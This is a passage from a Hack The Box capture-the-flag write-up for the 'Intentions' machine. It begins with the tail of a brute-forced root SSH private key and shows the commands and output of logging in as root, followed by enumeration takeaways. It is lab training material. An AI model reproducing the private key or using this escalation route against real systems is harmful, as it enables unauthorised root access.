ZyGpITFR/1KjaCQjLDnshZO7OrM/PLWdyipq2yZtNoB57kvzbPRpXu7ANbM8wV3cyk/OZt
0LZdhfMuJsJsFLhZufADwPVRK1B0oMjcnljhUuVvYJtm8Ig/8fC9ZEcycF69E+nBAiDuUm
kDAhdj0ilD63EbLof4rQmBuYUQPy/KMUwGujCUBQKw3bXdOMs/jq6n8bK7ERcHIEx6uTdw
gE6WlJQhgAp6hT7CiINq34Z2CFd9t2x1o24+JOAQj9JCubRa1fOMFs8OqEBiGQHmOIjmUj
7x17Ygwfhs4O8AQDvjhizWop/7Njg7Xm7ouxzoXdAAAFiJKKGvOSihrzAAAAB3NzaC1yc2
EAAAGBAOcjLoj2lj6+j9BmIlIuRJ6g/EDjPQe4JtpUx8JQOxTMPef8MvCVtx6hDGK1kjaV
9h6m78Z4TgQlv7sCjGxW+CzyPhM0enh6+bxuN/BKHhpixQb4YHueFpE70Mnb5OsasY8qYt
z4rypyNhpvgVs3DIupByPjSw1FZ+2jbYQSIPTsiFcKey15d3IFK1jOErb2GWchqSExUf9S
o2gkIyw57IWTuzqzPzy1ncoqatsmbTaAee5L82z0aV7uwDWzPMFd3MpPzmbdC2XYXzLibC
bBS4WbnwA8D1UStQdKDI3J5Y4VLlb2CbZvCIP/HwvWRHMnBevRPpwQIg7lJpAwIXY9IpQ+
txGy6H+K0JgbmFED8vyjFMBrowlAUCsN213TjLP46up/GyuxEXByBMerk3cIBOlpSUIYAK
eoU+woiDat+GdghXfbdsdaNuPiTgEI/SQrm0WtXzjBbPDqhAYhkB5jiI5lI+8de2IMH4bO
DvAEA744Ys1qKf+zY4O15u6Lsc6F3QAAAAMBAAEAAAGABGD0S8gMhE97LUn3pC7RtUXPky
tRSuqx1VWHu9yyvdWS5g8iToOVLQ/RsP+hFga+jqNmRZBRlz6foWHIByTMcOeKH8/qjD4O
9wM8ho4U5pzD5q2nM3hR4G1g0Q4o8EyrzygQ27OCkZwi/idQhnz/8EsvtWRj/D8G6ME9lo
pHlKdz4fg/tj0UmcGgA4yF3YopSyM5XCv3xac+YFjwHKSgegHyNe3se9BlMJqfz+gfgTz3
8l9LrLiVoKS6JsCvEDe6HGSvyyG9eCg1mQ6J9EkaN2q0uKN35T5siVinK9FtvkNGbCEzFC
PknyAdy792vSIuJrmdKhvRTEUwvntZGXrKtwnf81SX/ZMDRJYqgCQyf5vnUtjKznvohz2R
0i4lakvtXQYC/NNc1QccjTL2NID4nSOhLH2wYzZhKku1vlRmK13HP5BRS0Jus8ScVaYaIS
bEDknHVWHFWndkuQSG2EX9a2auy7oTVCSu7bUXFnottatOxo1atrasNOWcaNkRgdehAAAA
wQDUQfNZuVgdYWS0iJYoyXUNSJAmzFBGxAv3EpKMliTlb/LJlKSCTTttuN7NLHpNWpn92S
pNDghhIYENKoOUUXBgb26gtg1qwzZQGsYy8JLLwgA7g4RF3VD2lGCT377lMD9xv3bhYHPl
lo0L7jaj6PiWKD8Aw0StANo4vOv9bS6cjEUyTl8QM05zTiaFk/UoG3LxoIDT6Vi8wY7hIB
AhDZ6Tm44Mf+XRnBM7AmZqsYh8nw++rhFdr9d39pYaFgok9DcAAADBAO1D0v0/2a2XO4DT
AZdPSERYVIF2W5TH1Atdr37g7i7zrWZxltO5rrAt6DJ79W2laZ9B1Kus1EiXNYkVUZIarx
Yc6Mr5lQ1CSpl0a+OwyJK3Rnh5VZmJQvK0sicM9MyFWGfy7cXCKEFZuinhS4DPBCRSpNBa
zv25Fap0Whav4yqU7BsG2S/mokLGkQ9MVyFpbnrVcnNrwDLd2/whZoENYsiKQSWIFlx8Gd
uCNB7UAUZ7mYFdcDBAJ6uQvPFDdphWPQAAAMEA+WN+VN/TVcfYSYCFiSezNN2xAXCBkkQZ
X7kpdtTupr+gYhL6gv/A5mCOSvv1BLgEl0A05BeWiv7FOkNX5BMR94/NWOlS1Z3T0p+mbj
D7F0nauYkSG+eLwFAd9K/kcdxTuUlwvmPvQiNg70Z142bt1tKN8b3WbttB3sGq39jder8p
nhPKs4TzMzb0gvZGGVZyjqX68coFz3k1nAb5hRS5Q+P6y/XxmdBB4TEHqSQtQ4PoqDj2IP
DVJTokldQ0d4ghAAAAD3Jvb3RAaW50ZW50aW9ucwECAw==
-----END OPENSSH PRIVATE KEY-----

Done

```
We first create the `hash.log` empty file referenced in the script as the `-h` flag of our scanner and then fire off the script. As you can see it successfully bruteforced the `root` user's ssh key.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intentions/exploit]
└─$ chmod 600 root_rsa     
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/intentions/exploit]
└─$ ssh -i root_rsa root@intentions.htb        
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jul 28 08:57:24 PM UTC 2026

  System load:           0.01220703125
  Usage of /:            58.9% of 6.30GB
  Memory usage:          10%
  Swap usage:            0%
  Processes:             231
  Users logged in:       1
  IPv4 address for eth0: 10.129.229.27
  IPv6 address for eth0: dead:beef::a0de:adff:feee:3201


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

12 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@intentions:~# 

```
we `echo` that rsa key into a file on our local machine called `root_rsa` and `chmod 600` the permissions on it to make it acceptable as an ssh key and login successfully as `root` via ssh. Pwned.

## Takeaways

- when searching for an in, sometimes you should let the tool tell you it's suggested fixes to your payload/command (i.e. `sqlmap` suggesting the tamper script).
- When enumerating, especially an api or some other server that has directories which suggest multiple versions, attempt to manually enumerate those differences (i.e. v1, v2, etc.)
- Be sure to read up fully on the context of the service you're attacking to see what people have done to successfully exploit it in the context of **your** target (i.e. arbitrary object instantiation)
- always check file capabilities for interesting ones
- learn better python to script what you need something to accomplish
